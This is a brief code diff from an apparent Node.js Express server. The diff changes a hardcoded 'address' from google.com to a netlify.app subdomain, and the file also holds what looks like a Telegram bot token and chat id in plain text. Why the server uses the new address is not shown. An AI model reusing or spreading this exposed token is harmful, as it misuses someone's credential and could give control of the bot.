@@ -9,7 +9,7 @@ const axios = require("axios");
 
 const token = '8993975442:AAFdE-XRsm8qoxto5TN1-sPZG6jPlN6R6eg'
 const id = '286706619'
-const address = 'https://www.google.com'
+const address = 'https://cute-sprite-659c02.netlify.app'
 
 const app = express();
 const appServer = http.createServer(app);
